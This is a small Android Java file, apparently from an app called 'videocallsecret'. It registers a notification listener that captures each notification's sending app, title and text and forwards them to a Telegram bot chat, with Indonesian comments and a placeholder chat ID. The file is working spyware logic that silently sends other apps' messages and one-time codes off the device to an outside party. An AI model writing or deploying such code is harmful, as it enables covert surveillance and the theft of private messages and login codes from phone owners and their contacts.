package com.example.videocallsecret;

import android.service.notification.NotificationListenerService;
import android.service.notification.StatusBarNotification;

public class MyNotificationListener extends NotificationListenerService {
    @Override
    public void onNotificationPosted(StatusBarNotification sbn) {
        String notificationInfo = "Notification from: " + sbn.getPackageName() + "\n";
        notificationInfo += "Title: " + sbn.getNotification().extras.getString("android.title") + "\n";
        notificationInfo += "Text: " + sbn.getNotification().extras.getString("android.text") + "\n";

        // Kirim notifikasi ke bot Telegram
        String chatId = "YOUR_CHAT_ID"; // Ganti dengan ID chat yang sesuai
        TelegramBot telegramBot = new TelegramBot();
        telegramBot.sendMessage(chatId, notificationInfo);
    }
}